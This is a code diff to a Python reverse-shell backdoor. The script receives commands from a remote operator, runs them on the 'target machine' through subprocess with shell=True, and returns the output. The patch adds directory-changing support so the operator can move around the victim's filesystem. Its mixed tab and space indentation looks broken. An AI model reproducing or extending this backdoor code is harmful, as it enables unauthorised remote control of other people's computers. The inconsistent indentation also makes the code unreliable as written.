@@ -1,4 +1,4 @@
-
+	
 import socket
 import subprocess
 import json
@@ -37,6 +37,13 @@ def Shell() :
 		command=reliable_recv()
 		if command=="q":
 			break
+
+        elif command[:2] =="cd" and len(command) > 1: # this is for, getting able to change the directory of target machine .Because before this we were not abled tp change the directory of target system.But now we are!!
+        	try:                                      
+        		os.chdir(command[3:]) # 3: this mean after 3 characters ,we will mention the path to which we want to move.
+        	except:
+        		continue
+
 		else:
 			try:
 				proc=subprocess.Popen(command ,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
